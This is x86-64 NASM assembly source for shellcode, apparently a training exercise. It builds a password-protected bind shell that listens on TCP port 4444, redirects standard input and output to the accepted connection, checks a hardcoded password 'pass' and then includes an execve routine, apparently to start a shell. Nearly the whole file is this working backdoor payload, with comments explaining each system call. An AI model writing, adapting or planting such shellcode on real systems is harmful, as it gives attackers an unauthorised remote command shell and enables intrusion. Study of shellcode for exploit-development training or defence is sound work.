global _start

%define _START
_start:
    jmp real_start
    password: db "pass"
    pass_len: db $-password

real_start:
socket:
    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41

    push 41
    pop rax
    push 2
    pop rdi
    push 1
    pop rsi
    xor rdx, rdx
    syscall

    mov rdi, rax

bind:
    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = INADDR_ANY;    unsigned long
    ; bzero(&server.sin_zero, 8);
    ;
    ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
    ; struct sockaddr_in {
    ;     short            sin_family;
    ;     unsigned short   sin_port;
    ;     struct in_addr   sin_addr;
    ;     char             sin_zero[8];
    ; };
    ;
    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ; INADDR_ANY = 0
    ; AF_INET = 2
    ; __NR_bind = 49

    xor rax, rax
    push rax
    mov dword [rsp-4], eax
    sub rsp, 4
    push word 0x5c11  ; htons(4444)
    push word 2

    ; bind
    add al, 49
    mov rsi, rsp
    add dl, 16  ; sizeof(sockaddr_in)
    syscall

listen:
    ; listen(sock, 2)
    ; __NR_listen = 50

    mov al, 50
    xor rsi, rsi
    mov sil, 2
    syscall

accept:
    ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
    ; __NR_accept = 43

    mov al, 43
    xor rsi, rsi
    ;xor rdx, rdx
    syscall
    
    mov rbx, rax

    ; close(sock)
    ; __NR_close = 3

    mov al, 3
    syscall

dup2:
    ; dup2(new, 0);
    ; dup2(new, 1);
    ; dup2(new, 2);
    ; __NR_dup2 = 33

    xor al, al

    mov al, 33
    mov rdi, rbx
    xor rsi, rsi
    syscall

    mov al, 33
    inc rsi
    syscall

    mov al, 33
    inc rsi
    syscall

check_password:
    xor rax, rax
    ; rdi = fd (bound socket)
    sub rsp, 16   ; create space for "buf" in the stack
    mov rsi, rsp  ; rsi = *buf
    mov dl, 16
    syscall

    ; compare password
    xor rcx, rcx
    mov cl, [rel pass_len]
    lea rdi, [rel password]
    cld
    repz cmpsb
    jne exit

execve:
    %include "execve-stack.nasm"

exit:
    xor rax, rax
    mov al, 60
    syscall
